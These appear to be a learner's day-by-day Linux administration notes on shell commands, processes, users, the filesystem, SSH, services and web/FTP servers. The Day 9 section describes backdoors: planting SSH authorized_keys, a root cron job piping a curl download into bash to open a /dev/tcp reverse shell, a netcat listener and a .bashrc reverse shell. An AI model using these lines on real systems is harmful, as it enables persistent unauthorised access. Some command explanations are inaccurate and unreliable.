# Day 1
In linux everything is file 
- pwd
  It means print working directory. Whic tells you that in which present location you are.
- whoami
  This will tell you who is login in the system.
- date [+%D]
 It will tell  you the complete date month timezone in full format.
 For the customize data or specific things realted to the time and date you can use.
- ls -ltr
 It is use to sort the file 
- ls -lth
It is use to sort the file in readable format
- Clear
 It is use to clear the terminal or you can use `ctrl+l`.
- touch newfile_txt
 This touch command   will create the new file. 
- echo "Line to be written">file name with the format
 This will add the line in the given file .

 If you want to go to the last line of the file then just press the `SHIFT+G`.
 If you want to go to the first line directly then just press the `P`.
 Forward slash `/` is the top to bottom search. 
 Question marks is for bootom to up `?`.
- `#` It means that it is login as the root user or some privilage power .
- `$` It means that it is login as the normal user .
- `sh-5.2# means`You are using the shell command and you have the root .
- `cat` It is the command line utility that displays the file contents .It full form is concatenate .



user access, this is command prompt that you will execute administartive commands .

- `[root@archiso]#` is a command prompt seen in the terminal when logged in as the root
-  `root@archiso:` This is user and host combination this is not the command prompot. This is used for the documentation or specyfiying SSH login credential .



 # Process Management 
 It works is to track the process.
 Process uses the cpu .
 `ps` - process status.
  to check the process of anything just type ps -ef | grep name
  - How to get PID of process
    pgrep name of the service which you want to know the process .
    You will the process ID of running stuff only you wont get the process if of stopped thing
  -  How to stop a process ID
    `` kill -9 process_id`  // This will kill the process forcefully .
  -  How to stop procees with the name 
     `plill name `

  - How to see all the active jobs 
   Jobs are the task which we give to terminal
    `jobs`
     and ctrl+z is use to pause the job it not yet 
    bg for the process working in the background 

    # Networking part
    To check wheather the server is connected to the internet or not 
    `ping www.google.com`
    if we see that 0% packet is loss then it  is connected to the internet 
   

   # Day 2
   • You own the objects you create.
   • The special user account called “root” can act as the owner of any object,Certain system calls (e.g., settimeofday) are restricted to root.
   You control and communicate with most devices through files that represent them in /dev. Since device files are filesystem objects, they are
   subject to filesystem access control semantics. You can determine the ownerships of a file with ls -l:
   ## Root 
   Since root is just another user, most systems let you log in directly to the root account.To begin with, root logins leave no record of what operations were performed as root.Another disadvantage is that the log-in-as-root scenario leaves no record of who was actually doing the work.
   A marginally better way to access the root account is to use the `sudo` command.
   `Sudo` takes as its argument a command line to be executed as root (or as another
restricted user). sudo consults the file /etc/sudoers (/usr/local/etc/sudoers on
FreeBSD), which lists the people who are authorized to use sudo and the commands
they are allowed to run on each host. If the proposed command is permitted, sudo
prompts for the user’s own password and executes the command.
sudo keeps a log of the command lines that were executed, the hosts on which they
were run, the people who ran them, the directories from which they were run, and
the times at which they were invoked. This information can be logged by syslog or
placed in the file of your choice. 

Sudo has a couple of disadvantages as well. The worst of these is that any breach in
the security of a sudoer’s personal account can be equivalent to breaching the root
account itself., It is unfortunately not a safe way to define limited domains of autonomy or to place certain operations out of bounds.The rule is that sudo always obeys the last matching line, with matching being
determined by the entire 4-tuple of user, host, target user, and command. Each of
those elements must match the configuration line, or the line is simply ignored.
`TIP` -- Try to lock the root account using `passwd -l`
Most often, UIDs under 10 are system accounts, and UIDs between 10 and 100 are pseudo-users associated with specific pieces of software.

# Process
A process represents a running program. It’s the abstraction through which memory,
processor time, and I/O resources can be managed and monitored.
System and user processes follow the same rules, so you can use a single set of tools
to control them both.A process consists of an address space and a set of data structures within the kernel. The address space is a set of memory pages that the kernel has marked for the process’s use.Pages are the units in which memory is managed. They are usually 4KiB or 8KiB in size.A “thread” is an execution context within a process. Every process has at least one
thread, but some processes have many. Each thread has its own stack and CPU
context but operates within the address space of its enclosing process
 ## PID
The kernel assigns a unique ID number to every process.
A process’s scheduling priority determines how much CPU time it receives.
`ps -aux`- Comaand like ps show the snapshot of the system at particular time.
`ps -lax`- This works is also the same as ps-aux.but it is faster then ps-lax.
`top` -> It is the real-time version of ps that gives a regularly updated,intractive summary of process and their resource usage.
The Linux versions of ps and top read their process status information from the
/proc directory, a pseudo-filesystem in which the kernel exposes a variety of interesting information about the system’s state.


# Day 3
In linux we have single file system tree.
Attaching anything is called mounting .

- `cal` = A is default,that display a calender of the current month.
- `df` = To see the current amount of the free space in the your disk.
- `free` = To display the amount of the free memory .
- `exit` = To exit the terminal.
- `pwd` - Print the name of the current working directory
- `cd` = Change directory
- `ls` = List directory contents 
- `/dev` =This contain the device nodes.Everything is a file here kernal maintain the a         list of all the devices it understands.
- `/etc` = It maintain the system-wide configuration-file
- `/lib` = It contains the shared library files use by the core systems.
- `/opt` = It is use to store the optional software mostly it holds the commercial software.

- `127` = Means linux system was not able to find the command referenced inside the script.
- `echo ` = This prints the simple text arguments in the terminal.
- `echo` = $((any mathematical expression )) = This will simple follow the rule of the bodmas.

- `echo` { } = This will create the multiple string from the pattern containing braces.
- `su` = This command say that you are substitue user or switch user.,we just need to use su with the username of the desired account it will switch to that account.
- `su -l` to login as a root
-  `getent passwd `=The getent passwd command retrieves entries from the password database on a Linux system. This includes information about user accounts stored in the /etc/passwd file.
- `sudo userdel username` = This will  delete the user from the system.
- `history` =This will display the whole content of the of the history list.
- `id` = This is the numerical identifiar , The output will be  [`uid` This is known as the user id],[`gid` is the group id ],[`groups` are the fundamental of collection of the id  ].
- `Note` -> User accounts are defined at the /etc/passwd file, and groups are defined at the /etc/group file.
- `exit` - This command will take you to the root terminal.
- `passwd` - This will change the current password.
- `ps x` - This will give the bigger picture of what system is doing . `STAT` will be shown here which means that state abd revels the current status of the process.
- `ps-aux` - This will give the display of the process belonging to the every user.
      - USER -> this isowner of the process `User ID`
      - %CPU -> CPU usage as a percent 
      - % MEM -> Memory usage as percent
      - VSZ -> Virtual memeory size 
      - RSS -> The amount of physical memeory that is `RAM` the process is using in kilobytes.
      - Start -> Time when the process has started 

- `top` - This command display a continuously updating the system process listed in order
       - `Load average` -> It refers to the number of process that are waiting to run.
       - `Swap` -> This is swap space which means the virtual space is being used.
- `q`  - This will make you out from the shell.

#  Day 4
 - Boot process
  Most linux distribution copy the boot kernal message into a speical ring buffer in memeory called a kernal ring buffer(It is a data structure for logging message).The buffer is circular and set to a predetermined size. As new message are logged in the buffer,the older message are rotated out.
  The `dmesg` command displays the most recent boot message that are currently stored in the kernal ring buffer.
  `dmesg` it displays the most  recent boot message that are currently stored in the the kernal ring buffer,
- `ping` This command will check wheather your system is connected to the internet or not . 
   - `ping -n`-> For viewing them in  number.
   - `ping -l`-> For specifying the transmission as is 1 second. 
- `free` -> This command is use to check the amount of space is free in the system.
    - `free -g` -> To view in gb 
    - `free -k` -> To view in kb
    - `free -m` -> To view in mb
- `man` -> For the manual page 
- `passwd` -> For changging the password
-`w` -> It will give you the information regarding the list of logged in users 





# Networking
Web and email acces are the primary uses of computers.
- `curl icanhazip` This will show th external ip adderes .
- TCP/IP  is the networking system that underline the internet.It doesn't depend on any particulaar hardware or operating system. so devices that speaks TCP/IP can all exchange data,despite their many difference.

- IP -> Internet protocol,which routes data packets from one machine to another.
- ICMP -> Internet control message protocol,it defines the several kind of low-level support for the the IP,including the error message.
- ARP -> Address Resolution Protocol,it translate IP address to hardware address
- UDP -> The user datagram protocol,which implements the unverified-one way data delivery
- TCP -> The transmission control protocl which implents reliable,small duplex,flow-controlled,error-controlled conversations.

# Day 4
 - `ps` This will tell the list of  running process that are currently running for ur session. amd in detail you have to use `ps-u`.
 - `lscpu` This will tell the all CPU architure information as threads,sockets,cores and cpu.
 - `scp` This is used for securely transfeering files betweem machines.
 - `mv`  This command is used to move file from one to another.
 - `kill` This is used to kill the ongoing process manually from the terminal.
 - `env` This is use to display all the environment  variable in the Terminal.
 - `hwclock` This is use to view the hardware clock or set it new date.
 - `lshw` This will give the detailed hardware information information of the system on which the Linux is running.It gives you the small details about hardware.
 - `lspci` This will list the PCI device of your hardware. // PCI allow device to communicate with CPU and the other components.
 - `lsusb` This will list the USB decive of your hardware.

 - `nano` This will open the command line text editor .`ctrl+x will hwlp you to close this 

 - `yes` This is fun command 
 - `last` This will tell the list of last logged in users into the system as an output in linux terminal.

 - `kmod` This command will display all the currently loaded moduled on the system.
 - `pstree` This will display all the current running process in the tree format on the linux terminal.

 - `lsusb` This will show the information about all the `USB` buses connected to the hardware and external USB device connected to them.
 
 - `sudo` This will let u run any command with the root user permisson.
 - `apt`  This will help user to interact with the packaging system as .
 - `zip` This will help  you to compress the file 
 - `shutdownn` This will help you to shutdown the computer directly from the terminal.
 - `vmstat` This will let you known the system virtual memory usage.
 - `ssh` This will let you help to connect to host computer as a user.
 - `nice` This will let you change the priority of the running process.
 - `nproc` This will display the number of processing units alloted to the current running process.
 - `scp` This means secure copy is used to copy files and directories between hosts on the network
 - `sleep <n> ` This w
 - `tload` This will provide the load average.


# Day 5
 # Learning System  Adminstrating users and Groups 
   The identification process referred to as authentication,provide access to major function.
  - Configuration file are another mainstay for the Linux administration and everything is stored in the plain text file . 
  -  User accounts are stored in text file .
   -  `useradd`
   -  `usermod`
   -  `userdel`
   -  `tail/etc/passwd grep|username`  This need to be solved 
   - `w -  who ` This commands display all the current login user into the system.
 - Groups associate user account that have similiar security requirements.  
    - `groupadd` This create a new group .
    - `groupmod` This will modify the existing group.
    - `groupdel` This will delete the existing group.
 - One should always avoid logging into a system as the root user.
 - Standard user accounts typically  have privilages to manages their own data and some basic system things.
 - Service accounts represents service running on the system that consume resource as service are represented by their service accounts,these user cant usually make the configuration.
 - Any account using ` su - root` essentially is the server adminstrator.
 - `/sbin ` It contains the commands to boot your system . `fsck` is also part of this which is for checking the file systems,
 - `/usr/sbin` commands for managing the user accounts and checking the process that are holding files open .Commands that run as a daemons are also contained in this directories .
 -   `home` (personal config are stored)  and `/etc` (system-wide  configuration are stored) directory are the major 
 - `dmeg | less ` This will list the hardware component .
 - `lspci` This will list the buses connected to the busses to connected to the .
- Module are the kernal module which are the piece of the code that can be loaded and unlaoded into the kernal as needed without the need to reboot .These are the extended functionality of the kernal by adding support for the hardware device ,file,system and other features . 
 - `lsmod` this will list the loaded modules .
- `/sbin/modinfo -d snd-seq-oss ` This will list the information of the loaded modules. Note not all modules have the information available ,if there are info it will give the output else it will be the blank .
- Example 
  - useradd Kaushik 
  - su passwd kaushik
  - su Kaushik


 - Package management is the way of installing and managing the software on the system.
 Virtually all software for the linux are found at the internet .
 The basic unit of software in the packaging is the package file.A package file is the compressed collection of the files that comprises the software package.
 - Most of the tym package are rleased into central repository.
 - Pacman is the download manager for the arch distro .
 

# Day 6
- 
 `-` one dash informs the system that we will pass one letter argument, like 'l'
 `-` two dashes means that argument will contain more than one letter. Most commonly it will be an english word
 - Linux uses . on the beginning of the object's name. We call these files the dotfiles. 
 - The first, . simply means the current directory of the user.
 - The second, .. means parent directory.
 - `a` means all 
 - `A` measn almost all 

 - Linux allows us to list files using multiple sorting options.
    atime - the last time when file was accessed
    mtime - last modification time. By modification we mean change in the file content.
    ctime - last metadata modification time. We mean here - permissions change, location of the file, etc. 
    timestamp?

This is the numerical representation of the time. It is the number of seconds passed from Unix epoch which is midnight of 1st of January, 1970.

Example how it looks is visible below

$ date +%s
1635797690
$ date
Mon 01 Nov 2021 08:14:52 PM UTC
Well, on the occasion we learned a new command - date. Enough to say, this command shows the current date and time:

date .

The first sort option will be -t. This argument sorts files with the last modification time, newest files come first.

Let's try.

ls -lt

We use two arguments, to observe things better. We can specify exactly the modification time by adding u to the argument list. But please remember, in order to print this information properly you have to use t with another argument (u in this case).

ls -ltu

Ok, now let's print the list and order it by ctime - metadata change.

ls -ltc

Well, not much changed, right? Please execute these commands and carefully observe the output

touch theNewestFile (this creates a new file)
ls -ltu
ls -ltc
echo "hello world!" > file-02 (this will add something to the file)
ls -ltu
ls -ltc
chmod 444 file-01 (this will change the permissions of the file)
ls -ltu
ls -ltc

Please spend some time to understand what and how was printed. We used some commands which are new, but do not waste your time on them now.

OK, we know how to sort files by time, let's learn how to do it by size.

As usual, we have multiple options to do so.

First, we run this command

ls -s

This shows the short list of files and allocated space. As we already know, we can combine this argument - s - with others. Let's do it.

ls -ls

But this is what you have by default, using ls -l, right? No? You are correct, the answer is no. Take a look on the beginning of each line, this is where you can find, what was added by -s.

Why we used s? I wanted you to pay attention here. When capital S is used, this means sort.

ls -lS it sorts files by size, largest are going first.

So, arguments are case-sensitive, like... everything in Linux :)

Before we use the next command, there is one argument more to be learned. This argument is --human-readable, or better - -h

Let's try.

ls -lh we have printed the size of the files not in bytes, but in more readable form, with K, M, or G, that sort of things.

h use the powers of 1024. So, 1K is a 1 powered by 1024. We have another otion

ls -l --si

which uses powers of 1000. But.. I think no one uses that :

Ok, let's try to sort with h parameter

ls -lSh
drwxr means the owner have the directory with the read write and run the process .
Day 7
Man is one of the most powerfull tool we have in our linux system.
 `man man ` It will list all the manual page details 
 `man ls`   It will list all the command 
 In man we have different section available for each things 
 `man -f intro `
 `man -k ls`
 `man -w ls `

  # Work with the directories
 `ls -l` - It will check the directory.
 `mkdir` - It will new create the directory.
 `mkdir filenamw {n..n+}` This will create the multiple directory with the same name.
  `mkdir -p directoryname/filename` this will create the complicated file at one place.

 `cd` In order to change the directory we need to use this command
 `rmdir` This will remove the directory .
 `-r` This means that  go recursively  through the directories.
 `f` this means go forcefully.

 # Working with the files
  Remember file directory all are different 
  - To create the empty file we use the command `touch filename`. 
  - 'touch filename {n..n+1}' this will create the the multiple file 

  -`rm filename ` this will delete the particular file .


# Pipes and redirections 

- The concepts is simple, really. The pipes and redirections are used to send (or retrieve) some information sent from one command or script to another command or script. It works on files too.

- grep. This command search for given pattern in the output. Output may be the file or output from other command.

# Ps command
- ps
  - TTY - print the name of the Terminal associated with the process. 
  - TIME - total time of CPU usuage.
  -  CMD - the command which is running .
  - ps -a
  - ps a
  - ps T 
  - ps -A to list all the process
  `STAT` it means the state if the process.Here we have few abbrication 
   - D  uninterruptible sleep (usually IO)
   - I   Idle kernel thread
   - R  running
   - S  interrupitable sleep
   - T  stooped by the job control signal 
   - x  stopped should never be seen 
   - z   zombie process (terminated but not repead by its parent)

   - `ps -ef` for the admin
   - `ps aux --forest`
   - `ls -al`
   -  `ls -alh`

   History file is configured somewhere at the system which can be aceesed.
 # inode

 - `df`
 By definition, an inode is an index node. It serves as a unique identifier for a specific piece of metadata on a given filesystem, and the disk block location of this object.

The theoretical maximum number of inodes is equal to 2^32 (approximately 4.3 billion inodes). Second, and far more important, is the number of inodes on your system. Generally, the ratio of inodes is 1:16KB of system capacity.

# Soft and hard links 
Our system in full of links .
We have two type of links .
- `Hard`
- ` Soft` -system uses soft links to configure specific versions of tools, to the system-related services configurations.

- In short we can say that links are the shortcut to the original detination/file .





 # Day 7

 - `find / -type d` This will list all the directories of the system 
 - `ls / ` this will also list all the directories of the system 
 - `ls -al` The output permission.  
  ```Rust
  -rw-r--r-- 1 kaushikraj 197609  1264 May 13 14:57 06.md means
  rw-: The owner (kaushikraj) has read and write permissions.
  r--: The group (197609) has read-only permissions.
  r--: Others (everyone else) have read-only permissions.
  1: This indicates the number of hard links to the file.
  kaushikraj: This is the owner of the file.

  197609: This is the group that the file belongs to.

  1264: This is the size of the file in bytes.

  May 13 14:57: This is the date and time when the file was last modified.

  06.md: This is the filename.

  ```

  - `ls -s` This means that it will give the total size of the file .

# Day 8
 pacman -Q it is used to list the all the installed software in the system .
# Day 9
- A backdoor is simply something we can do to ensure our consistent access to the machine. Even if our machine is shutdown  or whatever we will be able to acces to it .

- These are not the vulnerabilities but just a way to maintain your acces on target .
- SSH key gen is the one the backdor of the to acces the system,to do so we simply run the command `ssh-keygem` .
  - Here we will have two key one private and other one will public . we can now go to /root/.ssh and leave our public key there. Don't forget to rename the public key to : authorized_keys
  - if the .ssh directory is not present then you can make the `mkdir .ssh`.
  - Before doing so, give the private key the right permissions using : chmod 600 id_rsa.
  - This backdoe isnt hidden at all anyone with the right permission can acces the desired machine ,
  - `-i` is the flag in the ssh that is use to show our private key .

- PHP backdors (This is out of my door)
 - Web root is actually located at the /var/www/html .


- CronJob Backdoors
 - This backdoor consist of creating a cronjob .
 - /etc/cronjob this represent all the task that are schdules to run at the some time on your machine ,you just need root acces to do this ,m and h stands for the minute and hour  .
 - dd this line into our cronjob file :

* *     * * *   root    curl http://<yourip>:8080/shell | bash

Notice that we put a "*" star symbol to everything. This means that our task will run every minute, every hour, every day , etc .

We first use "curl" to download a file , and then we pipe it to "bash"

The contents of the "shell" file that we are using are simply :

-------------------------------------------------

#!/bin/bash

bash -i >& /dev/tcp/ip/port 0>&1

--------------------------------------------------

We would have to run an HTTP server serving our shell.

You can achieve this by running : "python3 -m http.server 8080"

Once our shell gets downloaded, it will be executed by "bash" and we would get a shell!

*Don't forget to listen on your specified port with "nc -nvlp <port>"*

- `.bashrc` This is used for the one who have the bash as their login shell,and we can run the command to include our reverse sheel into their ".bashrc" .
- `pam_unix.so` This is the one of the backdor that is one of many file in the linux that is responsible for authentication .
 # Day 5.2
 Screen day 
  # Administrating Users and Groups .

- Modern OS require users to prove their identity. This identification process,refffered to as authentication,provides a major function .The user environament can be customized to fit that individual work on habit style .
 - The administarator shoul log on to the server with the non privillaged accounts and then elevates privilages only when it is necessary.
 - Manage the user account 
 - `/etc/passwd` file stores the actual user account and maintains
   various settings related to accounts.
 - `/etc/shadow` file stores password information for the accounts.
- It may seem odd that account information is distributed across two files and that
specifically password information is stored in a different file than user accounts .
- Each fetures are stored in the individual home directories .
- The tilde character represent the current user directory .
- `useradd` This will create the user
- `usermod`  This will modifies the existing user
- `userdel`  This will remove the exiting user .
- `groupadd` Create anew group
- `groupmod` Modify an existing group
- `groupdel` Remove an existing group
`Rust
useradd kaushik
groupadd sales
usermode -aG sales kaushik 
tail /etc/group | grep sales

ALWAYS TRY TO SAVE THE STATE 

`
- 'This is the command for the 
- Pluggable Authentication Models 
 - It supplements the authentication models .
 - `cat /etc/passwd` - It is the text file written by the root users and read by all users,it contains the information about the system users.
 - `cat /etc/shadow`- It  store the user passwd information in a secure manner. It is read by the root user only ,It protect the password by hasing them from the regulare users           

# IMPLEMENTING THE FILE MANGEMENT SYSTEM 
- The Filesystem Hierarchy Standard (FHS) that defines consistent
locations for data across the various Linux distributions and makes it easier for
users to navigate among directories to find and manage files and directories. Users
rely on an understanding of the FHS to perform file management tasks such as
creating and deleting resources .


- `/bin` This is the In Linux, the /bin directory is a fundamental part of the file system hierarchy, and it typically contains essential executable files and programs required for system booting, maintenance, and basic system operations.

- `'/boot` This contain the necessary information to boot the system .
- `/dev` This contains the information about the hardware and the software drivers .
- `/etc` This contains the information about the some configuration . Here we work with the management with the ssh and firewal also .
- `/lib`  This contains the information about the shared program lib required by the kernal ,
- `/opt` This contains the information about the large software file .
-`/tmp` Stord the information regarding the files that may be lost in the system.
-`/proc` This contain the information about the virtual file system
- `/usr` This contain the information about the small files that are accessoble to all the usr ,
# Day 11
-  `/home` The home directory contains a user’s personal files or files that are otherwise
specific to that user. The home directory is where you are placed when you log
in to the system.
- `/root`It is the home directory of the root user .The home directory of the root user is /root. This is not to be confused with the
root directory (/), which is the top-most part of the file system hierarchy. 
-`/var/log`  Linux and installed services typically write to log files stored in the /var/log
directory. 
- `The stat` command displays file metadata in a relatively user-friendly structure.
File size, access information, storage data, and more are displayed. 

# Use File Management Commands
The single dot character (represented by “.“) means “here“ or this directory.
Tile is the home directory of the current logged in user
- cp for copy 
- mv for move 

- `find`  This is use to search fot he file in the filesystem in linux.
- `large` This is use to search for the files in large system .
- `which` This is use to tell the complete path of the specified command . 
- `printf` This is similiar to echo but it give more flexibity to the user .
- `tr` This command is use to change the chracter of the string . echo "the gell" | ts 'g' 'h'
- `wc` It is use to  count the number of the lines .
 
- `top` It is the command line utility in the linux which provide the dynamic and real time view of the system process . It list the number of the process running on the system along with the various resource usuage , it is usefull for the monitoring the system .


 # UnderStanding the Server Administration 
 - Many servers are represented by the process that run continously  in the background and respond to request that come to them,these are known as the daemon .
 - Server exit to serve .
 - Server needs to accept the request for content from the users and systems .Unlike desktop system,which can simply close down all network ports that allows incoming request for access .
 -Diligent security is the important stuff . It is important for the administrator to handle the port of the server according to the need .Open up the ports that are need and lock down the port that are not needed .
 - We can secure the service using the iptable (firwalls) ,TCP (Wrappers) which allow and deny the servivce .
- Continous monitoring is something which keeps our eye on the server each time . We can monitor the server by using the tool which can be configure that can monitor the server,gather log .We can gather the report from the cpu clock memeory ususage and network activity and disk access .
 
-  Most of the service which we install linux are  configure ton start when we boot up the system .
- `Sysmtem md `  and `System V ` these are the two service for managing the software .
-  Most os the service are implemented as the  daemon service .
- Configuration file are need for the for the service reload  and boot .
-  `Daemon service ` It runs as a users and groups other than root ,in case they would not have the permission to access files beyod what sercvice has to offer .  
      - `/etc/sysconfig`It is a places where configuration file for the daemon service is storted .
- `Port number ` - Packets of the data go to and from your system over network interface through the port for each supported protocol . SElinux is enforcing mode that prevent the daemon from listing on that port .
- Some  service run on the demand using the `xinetd` super server .As the demand comes to the xineted service then it launches the requested service  and hands the request off  to that service .


# Secure server 
- Securing the server is one of the crucial part when you allow remote user to acces it over the network .

- Always disallow user to login as the root user and require every user to login as the regular user and then us su or sudo to become root  .
- Use `iptable firewall ` to track  accept and reject  every packet making the request for service of ur system . Allowing certain ip address only is good practices .
- `/etc/hosts.allow and /etc/host.deny`  these two can help us to allow or deny  accessing to those service that have the tcp wrappers fetures enabled libwrap .
- `SELinux ` main function is to protect the content of the linux system from the process running on the system . It makes sure that any server can acces the only restricted set of the files on the system and allow only restricted set of fetures .

# Monitor the server 
- By default  the log mess age are stored in the into the `/etc/log ` directory .
For enachanced security and convience we can direct the log message to the central server ,providing the centralized location to view and mange the logging .
- `ryslog /d` is also use to gather the criticial information .
- `logwatch` fetures scans your log files  and sends critical information gathred from the thosse to  your email account .
- `systat` provide the `sar` facility to watch your system .
- `rpm -V` is use to check if any commands  documets or config file are tampered with on your system .

# Managing the remote access with the secure shell service .
- Secure shell tools are sets of the client of the and server application that allow you to do basic communication between client  computers and Your linux server . The communication is encrypted is between the server and the clients ,
      - SSH
      - SFTP
      - telnet should be use for testing purpose only .
- `pacman` is the package manager for the software distribution in the ARCH distibution .

# Starting the openshh-server service 
- Linux systems that come opessh-server package already installed often are not configured for it to start automatically .
- If sshd (secure shell deamon ) is not currently running ,you can start running it by issuing one of the commands . These commands need root privilieges in order to work .

-  It is best to use the TCP wrappeers with the ssh service . 
-  Any further configuration for what the sshd deamon is allowed to do are handled in the `/etc/ssh/sshd_config `file .Yes or NO Will change the remotely logging in as root .

 # Using SSH clinet tools 
 - There are many tools for accessing the linux system have been created to access the service
 - Commands like scp and rsync can copy one or more files at the time between ssh client and server system .
 - The sftp provides FTP like interface for traversing a remote filesytem.
 - By defualt ssh realted tools authenticate the standard linux username over all encrypted system .
 - `ssh username @10.123.21.`  This will generate the authenticity of the authenticity of the host  and will ask to yes/no as it depends upto you what u are going to do .
     - Type yes and press Enter then it will ask you for the users password ,
      - When you type the yes then ypu continue to accept the remote host public keyy  .
      At this point remote hosts public key is downloaded at the client side in the  /.ssh/known_hosts  file and  now the data exchanged between two systems can be encrypted and decrypted using the RSA asymmetric encryption .
      - Once you are in it will be like a normal system the only differenc will be that the data will be transfered in the encrypted form .
      - Exit command is to end the remote coonection .
      - `-` usually will close the coonction .
      - `ls .ssh` This will lsit the host name  .
      - `cat .ssh/hostnames` will list the rsa name .

-   After logging into a remote shell,the ssh command can be used to execute a command on the remote system and have the output returned to the local system .
- Files can be copied from the local system to the host system .
- We can generate the key to make the things passwordless .
 System logging is the one of the basic service configured for linux to keep track of what is happenning in the system .
 - The  system activity report (sar) is the one of the oldest  way to monitor the sytem .
 - Logwatch can give you the snapshot of the space consumption on your screen .
 - While the `df` and the  can help you to immeditaely see how much disk space is available .
- `du`  is being use to show how much space is consumed by a particular directory .
- `find` is aslo use to find the disk consumption .

# Administrating Networking 
 - We can coonect the linux system to the network easily huh  .
 - Network manager  is one of the excelent choice for the Desktop/laptop/networking 
 - The computer must have the network interface(wired or wireless) ,an IP address ,an assigned DNS server nd route to the internet to the internert (identifid by a gateway device ) for the connection .
 - Activate network interface - Network manger looks  to see what  interface are set to  start automatically , By default external interface are set to  start the automatialyy using DHCP.
 - Linux acts as the dhcp client to send out the request and uses the mac addres of the network interface for to identify the identify in the request .
 - DHCP server has the typically range of the IP address it can hold .The DHCP provide the spercific address to request from the specific MAC address. 

 - `ip addr ` This will show the basic info .
 
# Starting and stopping service

- A service is called a daemon and it is a running process that provides a particular function .
- A linux server primary job is to offer services.
- As a linux server administrator one of your primary job is managing these services .
- In order to understand the service management we need to understand the init  daemon .
    - The init deamon is the first process started by the kernal on the linux server .
    - The init once started is responsible for spawning (launching ) process configured to be started at the server boot time .
    - The hardware had changed from static to the event-based due to which the new initdaemon is desgned in such a way that it can deal with the fluid environment now.
    - Two of the init daemon are `Upstart` and `systemd`
    - `sudo strings /sbin/init | grep -i systemd`
    - We can install string commands via binutils package .
    - SysVinit daemon the BSD daemon's configuration information is stored at the boot time from the `/etc/inittab` file .
    - `inittab` Describe how the system should setup the system at the certain level.
    - The init command will accept any of the runlevel numbers ,allowing quickely to switch your server from one runlevel category to another ,
    - Troubleshooting require the graphical interface should be the downn .
    - Runlevel is a command use to display the current runlevel . The first item will be displayed shows the previous server runlevel and secoond one will show the current one .
    - `telinit` is command which also function the same . for example telinit is command is use to reboot the server by taking it to runlevel 6 .
    - On the freshly booted linux server ,the current runlevel number should be the same as the default runlevel number in the /etc/inittab file . The N indicated fotr the "Nonexistent and it indicate the server has been freshly booted .
     - `SysVinit` Was created to operate in a static environment with this service are stopped and started based upon the runlevels.
- The main difference between classic and Upstart is the handling of stopping and starting the services .
     - Upstart init is created to operate in the flexible and ever-changing environment . The  upstart is created with the to operate in the flexible and ever-changing environment .
    - Upstart is not concerned with the runlevels but with the system events .
    - System events determine when service are stopped and or started . An event is a linux server occurrence that trigges the  needed state change .
    - Upstart handle the job thorugh task and service , service never finishes its work or self-terminates but it stays in the runninng states . A task complete the work and wait in the waiting area .
- Systemd init modern init way .
  - With the use of this syteminitilization time is reduced .
  - It starts the fewer service and starts them in the parallel manaer .
  - Systemd can handle a fluid environment because it supervise the al process on the entire linux .
  - Units are the focus of the systemd  and the units are the group consisting of a name ,type and configuration file and it focus on a particulare service or actions.
   - The eight systemd units are the :
      - automount
      - device 
      - mount 
      - path 
      - service 
      - snapshot
      - socket 
      - target 
 - A Service unit is for managing the daemons on your linux server. A target unit is simply a group of other units .
 - Each service unit name end with the .service 
 - As a system administrator it is ur duty to audit the service being offered on your server for the documentation .
   - chkconfig --list
   - service --status-all | grep running.. | sort  will list the current runnig service .
   - `chckconfig --list cups`  is the servie command to view an individual service setting. 
   - `service status`
   - `intitctl status vpnc-cleanup` will show the status of a single service .
   - `systemctl list-unit-files --type=service | grep -v disbled ` This will list all the service that are being offered by a linux server using systemd .
   - `service cups stops` This will stop the daemon
   - `service cups status` This will show the status .
   - `service cups start/restart` This will start the service.
   - `initctl status cups` Will chek the status of the service using init daemon.  
   - `initctl start/restart/reload cups`
   - `initctl stop cups`


# Configuring a web server 
Web server are responsible for serving up the content on the internet  that we view on the internet everyday .
- HTTPD (Apache ) is one of the popular webserver .
- We can genereate certificates to creates an HTTPS Secure Sockets layer (SSL) .
- Apache HTTPD provides the service with which the client web browser communicate .
  - Download the httpd package using the ddownload manager .
  - Run the RPM to view its content .
  - The download manager will download the latest version package to the current directory .
  - rpm -qpc httpd-*rpm will result the detailed of the downloded information .
  - `/etc/httpd/concf/httpd.concf`  is the main configuration file .
  - welcome.conf will define the default homepage for your website .
  - magic file defines the rule of the server .
  - `/etc/sysconfig/httpd` command
  - `/etc/logrotate.d/httpd` file define how log files roduced by the Apache are rotated 
  - `/etc/tempfiles.d/httpd` files define directory that contains the temporary run-time files .
  - Any files in the dorectory that end with the .conf is pulled into the main httpd.conf file and use to config the Apace .
  - `yum groupinstall "Web Server "` This will install the entire web server group .
  - `chkconfig httpd on `
  - `service httpd start`
  -  When the HTTPD service start eigyht httpd daemon process are launched by defult .
  - `ps -ef | grep httpd ` This will  show the ps after restart .
  -  The apache daemon process runs as the user apache and group apache . By default the the HTml content will be stored in the /var/www/html directory.
  - You need to open up the several  ports for the client to be able to talk to apache through the firewalls.
  - HTTP is accessible over port 80
  - HTTP is accessible over port 443 and these two use TCP .
  - `netstat -tupln | grep httpd ` this will verify that the port is open or not .
  - You can add new rule and restart the iptable to see the changes .
  - SELinux is inforced  then it will add an extra securoty lsyer to the httpd .
  - In the apache flexibilty comes at the cost of the complexity .
  - `yum install mode_ssl` this will download the ssl package  and will  help in the implementation of the ssl.
  - ` yum install openssl ` Use this to begin setting up ssl .it will generate the public and private key .
  - Generate the 1024-bit RSA private key and save it to a file  .
  - cd/etc/pki/tlsprivate 
  - openssl genrsa -out server.key 1024 
  - chmod 600 server.key 
  - openssl gensra -des3 -out server .key 1024

    
# Configuring the FTP server 
FTP is one of the oldest protocol used for transfering the file over the network
There are more protocol over the internet for sharing the FTP.
- Here we will use the vsftpd package as test case .
- FTP operarte in a client/server server model. \
- Ftp server daemons listen daemons listens for incoming request on TCP port 21 from FRP client .
- If the servers accepts the login information then the client can interactively traverse the filesystem.
- FTP doesnt come with the encryption as the every thing is sent in the form of the clear text which is vulnerable in form of the the security perspective .
- FTP is not good for sharing the file privalety but it is usefull in sharing the file publicly .
- FTP public account is known as the  anonymous  as here there is no need of any login stuff . And it cant go outside the /var/ftp
- FTP support the active and passive connection .
- Once the connection is established between the ftp then the client current directory is established .
- `yum install vsftd `
- `ss` This will show the sockets .
- `lsof` This will show the opened file .
-  `lsblk` This will show the list of the block device .
- `






 
 
 
 # Tmux 
 - `tmux kill-server` This will kill the server from the command line .
 - `CTRL+B` This is is the prefix for the tmux .
 - Server networking 
 - Enterprise networking 

# Production level 
- User mode comm,and is use to modify the user .
# WATCH 
- Allow you to run command over and over .
- It going to highlight the changes .
- Here we have the ability to hightlight the changes the time stamp which meand that how often we wana change the command .  
